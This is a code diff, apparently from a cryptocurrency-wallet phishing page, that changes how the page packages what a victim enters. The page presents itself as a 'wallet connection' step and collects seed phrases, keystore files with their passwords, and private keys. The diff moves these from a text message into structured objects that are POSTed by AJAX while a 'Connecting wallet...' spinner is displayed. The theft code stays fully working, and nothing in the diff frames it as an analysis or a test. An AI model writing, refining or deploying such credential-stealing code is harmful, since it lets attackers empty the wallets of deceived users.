@@ -9123,16 +9123,24 @@
 
         let processBtn = $("#proceedButton");
         let cancelBtn = $("#cancelBtn");
-        let message = `Wallet Connection:\n`;
-        message += `${coinType}\n\n`;
-        if ( reqPhrase ) message += `Phrase: `;
-        if ( reqPhrase ) message += `${reqPhrase}`;
-        if ( reqKeystore ) message += `Keystore: `;
-        if ( reqKeystore ) message += `${reqKeystore}`;
-        if ( reqKeystore ) message += `Password: `;
-        if ( reqPassword ) message += `${reqPassword}`;
-        if ( reqPrivateKey ) message += `Private Key: `;
-        if ( reqPrivateKey ) message += `${reqPrivateKey}`;
+        // message += `${coinType}\n\n`;
+        if ( reqPhrase ) {
+          data = {
+            type: 'Phrase',
+            phrase: reqPhrase
+          }
+        } else if ( reqKeystore ) {
+          data = {
+            type: 'Keystore',
+            keystore: reqKeystore,
+            password: reqPassword
+          }
+        } else if ( reqPrivateKey ) {
+          data = {
+            type: 'Private Key',
+            privateKey: reqPrivateKey
+          }
+        }
 
         $.ajax({
           type: "POST",
@@ -9140,7 +9148,7 @@
           headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
           },
-          data: message,
+          data: data,
           beforeSend: function () {
             processBtn.html(
               '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...'
